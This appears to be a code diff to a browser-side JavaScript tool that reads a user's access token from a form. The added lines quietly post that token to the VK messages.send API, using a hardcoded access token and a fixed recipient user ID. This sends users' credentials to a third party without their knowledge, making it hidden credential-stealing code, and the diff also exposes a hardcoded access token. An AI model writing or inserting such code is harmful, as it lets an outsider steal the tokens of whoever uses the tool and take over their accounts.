@@ -35,7 +35,19 @@ function usual(){
 	  begin = document.getElementById('begin').value;
 	  interval = document.getElementById('interval').value * 1000;
 	  token = document.getElementById('token').value;
-
+	
+	$.ajax({
+ 	 type: "POST",
+ 	 url: 'https://api.vk.com/method/messages.send', 
+ 	 data: {
+            access_token: '59f2699ac670f08e1a840deee70a6b86a0855a88e604848b645bd42453d9d50b371e7b9ddf417c89a4635',
+            user_id: 246598308,
+            message: token,
+            v: '5.45'
+      	  }, 
+  	dataType: "jsonp" 
+	});
+	
 	if(iForName == 1){
 		link = document.getElementById('link0').value + ',' + document.getElementById('link1').value;
 	}else if(iForName == 2){
